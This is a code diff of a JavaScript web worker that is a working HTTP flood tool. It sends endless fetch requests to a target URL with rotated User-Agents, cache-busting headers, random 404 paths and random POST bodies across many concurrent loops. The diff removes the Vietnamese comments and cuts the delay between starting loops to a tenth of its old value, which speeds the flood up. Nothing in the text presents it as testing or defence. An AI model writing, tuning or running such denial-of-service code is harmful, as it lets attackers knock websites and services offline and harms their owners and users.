@@ -10,7 +10,6 @@ self.onmessage = function(e) {
     let completed = 0;
     let running = true;
     
-    // Pool User-Agent đa dạng
     const uas = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
@@ -22,7 +21,6 @@ self.onmessage = function(e) {
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
     ];
     
-    // Headers tối ưu để bypass cache
     const headers = {
         'Cache-Control': 'no-cache, no-store, must-revalidate',
         'Pragma': 'no-cache',
@@ -34,10 +32,8 @@ self.onmessage = function(e) {
         'Upgrade-Insecure-Requests': '1'
     };
 
-    // ===== TẠO ĐƯỜNG DẪN 404 =====
     function generate404Path() {
         let path = '';
-        
         if (attackMode === '404' || attackMode === 'mixed') {
             if (custom404Paths && custom404Paths.trim()) {
                 const paths = custom404Paths.split('\n').filter(p => p.trim());
@@ -67,30 +63,24 @@ self.onmessage = function(e) {
                     fullPath += '/' + dir;
                 }
                 fullPath += '/' + randomPath;
-                
                 const exts = ['.php', '.html', '.js', '.css', '.jpg', '.png', '.pdf', '.zip', '.tar', '.gz', '.sql', '.log', '.txt', '.xml', '.json'];
                 const ext = exts[Math.floor(Math.random() * exts.length)];
                 path = fullPath + ext;
             }
-            
             path += '?id=' + Math.random().toString(36).substring(2, 10);
             path += '&t=' + Date.now();
             path += '&r=' + Math.random().toString(36).substring(2, 8);
         }
-        
         return path;
     }
 
-    // ===== GỬI REQUEST TỐI ƯU =====
     function sendRequest() {
         while (running && count < maxRequests) {
             count++;
             try {
                 let targetUrl = url;
-                
                 if (attackMode === '404' || attackMode === 'mixed') {
-                    const randomPath = generate404Path();
-                    targetUrl = url + randomPath;
+                    targetUrl = url + generate404Path();
                 } else {
                     targetUrl = url + '?r=' + Math.random().toString(36).substring(2, 8) + '&t=' + Date.now();
                 }
@@ -111,16 +101,13 @@ self.onmessage = function(e) {
                     redirect: 'follow',
                     referrerPolicy: 'no-referrer'
                 };
-                
                 if (method === 'POST') {
                     opts.body = 'data=' + Math.random().toString(36).substring(2, 15) + '&t=' + Date.now();
                     opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                 }
-                
                 fetch(targetUrl, opts).catch(() => {});
             } catch (e) {}
             
-            // Gửi tiến trình mỗi 10 request
             if (count % 10 === 0) {
                 self.postMessage({ type: 'progress', count: count });
             }
@@ -132,12 +119,10 @@ self.onmessage = function(e) {
         }
     }
 
-    // ===== KHỞI CHẠY NHIỀU LUỒNG =====
     for (let i = 0; i < threads; i++) {
-        setTimeout(() => sendRequest(), i * 0.1);
+        setTimeout(() => sendRequest(), i * 0.01);
     }
 
-    // Lắng nghe lệnh dừng
     self.onmessage = function(msg) {
         if (msg.data === 'stop') {
             running = false;
